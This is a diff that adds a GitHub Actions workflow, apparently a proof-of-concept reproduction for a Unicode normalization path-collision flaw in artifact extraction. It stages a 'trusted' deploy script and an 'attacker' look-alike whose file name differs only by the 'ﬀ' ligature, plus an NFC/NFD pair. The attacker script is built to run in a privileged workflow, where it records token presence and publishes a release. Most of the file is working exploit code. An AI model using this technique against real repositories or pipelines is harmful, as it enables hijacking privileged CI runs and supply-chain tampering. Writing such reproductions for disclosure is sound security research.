@@ -1,0 +1,163 @@
+name: Artifact Internal Path Source Impact Stable
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Prepare deterministic single-artifact payload
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf payload
+          python3 - <<'PY'
+          from pathlib import Path
+          from textwrap import dedent
+          import hashlib
+          import json
+          import unicodedata
+
+          root = Path("payload")
+
+          trusted_deploy = dedent("""\
+          #!/usr/bin/env bash
+          set -euo pipefail
+          mkdir -p observations
+          {
+            echo "source=trusted-stable-internal-deploy-script"
+            echo "method=single-artifact-internal-path-stable-control"
+            echo "download-mode=${DOWNLOAD_MODE:-unknown}"
+            echo "source-run-id=${SOURCE_RUN_ID:-unknown}"
+          } > "observations/trusted-stable-internal-${DOWNLOAD_MODE:-unknown}.txt"
+          """)
+
+          attacker_deploy = dedent("""\
+          #!/usr/bin/env bash
+          set -euo pipefail
+          mkdir -p publish observations
+
+          PROOF="publish/internal-path-stable-${DOWNLOAD_MODE}-codeexec-proof.txt"
+          TAG="artifact-internal-path-stable-${DOWNLOAD_MODE}-${SOURCE_RUN_ID}"
+
+          cat > "$PROOF" <<EOF
+          source=attacker-stable-internal-path-deploy-script
+          method=single-artifact-unicode-internal-path-collision-stable
+          download-mode=${DOWNLOAD_MODE}
+          source-run-id=${SOURCE_RUN_ID}
+          source-run-url=${SOURCE_RUN_URL}
+          privileged-run-id=${PRIVILEGED_RUN_ID}
+          repository=${GITHUB_REPOSITORY}
+          trusted-exec-rel=${TRUSTED_EXEC_REL}
+          attacker-exec-rel=${ATTACKER_EXEC_REL}
+          trusted-chunk-rel=${TRUSTED_CHUNK_REL}
+          attacker-chunk-rel=${ATTACKER_CHUNK_REL}
+          gh-token-present=${GH_TOKEN:+true}
+          EOF
+
+          gh release delete "$TAG" --repo "$GITHUB_REPOSITORY" --yes --cleanup-tag >/dev/null 2>&1 || true
+          {
+            echo "Stable single-artifact internal path Unicode collision impact"
+            echo
+            echo "Source run: ${SOURCE_RUN_URL}"
+            echo "Download mode: ${DOWNLOAD_MODE}"
+            echo "The attached proof was produced by executing the trusted internal path after artifact extraction."
+          } > "observations/internal-path-stable-${DOWNLOAD_MODE}-release-notes.md"
+
+          gh release create "$TAG" "$PROOF" \
+            --repo "$GITHUB_REPOSITORY" \
+            --target "$GITHUB_SHA" \
+            --title "Stable internal path collision ${DOWNLOAD_MODE} ${SOURCE_RUN_ID}" \
+            --notes-file "observations/internal-path-stable-${DOWNLOAD_MODE}-release-notes.md"
+
+          gh release view "$TAG" \
+            --repo "$GITHUB_REPOSITORY" \
+            --json url,tagName \
+            --jq '{tagName: .tagName, url: .url}' > "observations/internal-path-stable-${DOWNLOAD_MODE}-release.json"
+          """)
+
+          # The attacker aliases are intentionally listed after the trusted paths.
+          # The upload step below also lists paths in this order to make zip entry
+          # materialization deterministic for reproduction.
+          payload = [
+              ("bin/deploy-ff.sh", "trusted executable path", trusted_deploy),
+              ("bin/deploy-\ufb00.sh", "attacker executable path; NFKC-equivalent to trusted path", attacker_deploy),
+              ("dist/release-e\u0301.txt", "trusted chunk-built NFD path", "source=trusted-stable-nfd-chunk-path\n"),
+              ("dist/release-\u00e9.txt", "attacker whole NFC path", "source=attacker-stable-nfc-whole-path\n"),
+          ]
+
+          for rel, _, body in payload:
+              path = root / rel
+              path.parent.mkdir(parents=True, exist_ok=True)
+              path.write_text(body, encoding="utf-8")
+
+          manifest = {
+              "purpose": "Stable reproduction for single-artifact internal path Unicode normalization collision",
+              "expectedUploadOrder": [rel for rel, _, _ in payload] + ["MANIFEST.json"],
+              "pairs": {
+                  "executable": {
+                      "trusted": "bin/deploy-ff.sh",
+                      "attacker": "bin/deploy-\ufb00.sh",
+                      "rawEqual": False,
+                      "nfcEqual": unicodedata.normalize("NFC", "bin/deploy-ff.sh") == unicodedata.normalize("NFC", "bin/deploy-\ufb00.sh"),
+                      "nfkcEqual": unicodedata.normalize("NFKC", "bin/deploy-ff.sh") == unicodedata.normalize("NFKC", "bin/deploy-\ufb00.sh"),
+                  },
+                  "chunk": {
+                      "trusted": "dist/release-e\u0301.txt",
+                      "attacker": "dist/release-\u00e9.txt",
+                      "rawEqual": False,
+                      "nfcEqual": unicodedata.normalize("NFC", "dist/release-e\u0301.txt") == unicodedata.normalize("NFC", "dist/release-\u00e9.txt"),
+                      "nfkcEqual": unicodedata.normalize("NFKC", "dist/release-e\u0301.txt") == unicodedata.normalize("NFKC", "dist/release-\u00e9.txt"),
+                  },
+              },
+              "files": [],
+          }
+
+          for rel, label, _ in payload:
+              data = (root / rel).read_bytes()
+              manifest["files"].append({
+                  "path": rel,
+                  "label": label,
+                  "sha256": hashlib.sha256(data).hexdigest(),
+                  "size": len(data),
+              })
+
+          manifest_path = root / "MANIFEST.json"
+          manifest_path.write_text(json.dumps(manifest, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
+
+          for rel in manifest["expectedUploadOrder"]:
+              path = root / rel
+              print(json.dumps({
+                  "path": rel,
+                  "nfc": unicodedata.normalize("NFC", rel),
+                  "nfkc": unicodedata.normalize("NFKC", rel),
+                  "sha256": hashlib.sha256(path.read_bytes()).hexdigest(),
+              }, ensure_ascii=False, sort_keys=True))
+          PY
+
+      - name: Upload deterministic single artifact
+        id: upload
+        uses: actions/upload-artifact@v7
+        with:
+          name: artifact-internal-path-stable-${{ github.run_id }}
+          path: |
+            payload/bin/deploy-ff.sh
+            payload/bin/deploy-ﬀ.sh
+            payload/dist/release-é.txt
+            payload/dist/release-é.txt
+            payload/MANIFEST.json
+          include-hidden-files: true
+          compression-level: 0
+
+      - name: Print artifact metadata
+        shell: bash
+        run: |
+          set -euo pipefail
+          echo "artifact-name=artifact-internal-path-stable-${GITHUB_RUN_ID}"
+          echo "artifact-id=${{ steps.upload.outputs.artifact-id }}"
+          echo "artifact-url=${{ steps.upload.outputs.artifact-url }}"
+          echo "artifact-digest=${{ steps.upload.outputs.artifact-digest }}"
